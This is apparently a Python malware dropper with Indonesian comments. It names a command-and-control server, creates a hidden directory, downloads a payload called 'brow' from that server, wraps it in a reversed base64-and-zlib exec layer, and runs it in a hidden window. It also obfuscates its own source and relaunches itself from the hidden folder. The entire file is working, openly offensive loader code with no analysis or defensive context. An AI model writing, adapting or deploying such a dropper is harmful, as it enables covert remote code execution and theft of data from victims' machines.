import os
import sys
import platform
import requests
import subprocess
import time
import base64
import zlib

# Konfigurasi C2
C2_HOST = "http://192.168.0.29:1224"
PAYLOADS = {
    "brow": f"{C2_HOST}/brow/5346/224",
}
HIDDEN_DIR = os.path.expanduser("~/.n2")
SLEEP_INTERVAL = 5


# Fungsi untuk mengobfuskasi kode satu lapisan
def obfuscate_layer(code):
    code_bytes = code.encode('utf-8')
    compressed = zlib.compress(code_bytes)
    base64_encoded = base64.b64encode(compressed)
    reversed_str = base64_encoded[::-1]
    return f"exec(__import__('zlib').decompress(__import__('base64').b64decode('{reversed_str.decode('utf-8')}'[::-1])))"


# Fungsi untuk mendeteksi OS
def detect_os():
    os_type = platform.system().lower()
    if "windows" in os_type:
        return "windows"
    elif "darwin" in os_type:
        return "macos"
    elif "linux" in os_type:
        return "linux"
    else:
        return "unknown"


# Fungsi untuk membuat direktori tersembunyi
def setup_hidden_dir():
    if not os.path.exists(HIDDEN_DIR):
        os.makedirs(HIDDEN_DIR)
        if detect_os() == "windows":
            subprocess.run(["attrib", "+h", HIDDEN_DIR], shell=True, stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)


# Fungsi untuk mengunduh payload dari C2
def download_payload(url, filename):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            filepath = os.path.join(HIDDEN_DIR, filename)
            with open(filepath, "wb") as f:
                f.write(response.content)
            if detect_os() == "windows":
                subprocess.run(["attrib", "+h", filepath], shell=True, stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL)
            return filepath
        else:
            print(f"[-] Gagal mengunduh {filename}: Status {response.status_code}")
            return None
    except Exception as e:
        print(f"[-] Error saat mengunduh {filename}: {e}")
        return None


# Fungsi untuk mengeksekusi payload
def execute_payload(filepath):
    os_type = detect_os()
    try:
        if os_type == "windows":
            subprocess.Popen(["python", filepath], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
        else:
            subprocess.Popen(["python3", filepath], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[+] Berhasil mengeksekusi {filepath}")
    except Exception as e:
        print(f"[-] Gagal mengeksekusi {filepath}: {e}")


# Fungsi utama Main5346
def main5346():
    print("[*] Main5346 dimulai...")
    setup_hidden_dir()

    payloads_to_download = [
        ("brow", "brow5346_224.py"),
    ]

    for payload_name, filename in payloads_to_download:
        url = PAYLOADS[payload_name]
        print(f"[*] Mengunduh {payload_name} dari {url}")

        filepath = download_payload(url, filename)
        if filepath:
            # Obfuskasi file yang diunduh (hanya 1 lapisan untuk stabilitas)
            with open(filepath, "r") as f:
                payload_content = f.read()
            obfuscated_content = obfuscate_layer(payload_content)
            with open(filepath, "w") as f:
                f.write(obfuscated_content)

            execute_payload(filepath)
        else:
            print(f"[-] Gagal mengunduh {payload_name}, mencoba lagi dalam {SLEEP_INTERVAL} detik")
            time.sleep(SLEEP_INTERVAL)

    print("[*] Main5346 selesai menjalankan tugas")


if __name__ == "__main__":
    # Obfuskasi kode Main5346 dan simpan ke file sementara
    obfuscated_file = os.path.join(HIDDEN_DIR, "main5346_obfuscated.py")
    setup_hidden_dir()

    with open(__file__, "r") as f:
        original_code = f.read()

    # Obfuskasi hanya 1 lapisan untuk menghindari RecursionError (bisa ditingkatkan secara terpisah)
    obfuscated_code = obfuscate_layer(original_code)

    # Simpan kode yang diobfuskasi ke file
    with open(obfuscated_file, "w") as f:
        f.write(obfuscated_code)

    # Jalankan file yang diobfuskasi
    os_type = detect_os()
    try:
        if os_type == "windows":
            subprocess.Popen(["python", obfuscated_file], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
        else:
            subprocess.Popen(["python3", obfuscated_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[+] Menjalankan kode yang diobfuskasi dari {obfuscated_file}")
    except Exception as e:
        print(f"[-] Gagal menjalankan kode yang diobfuskasi: {e}")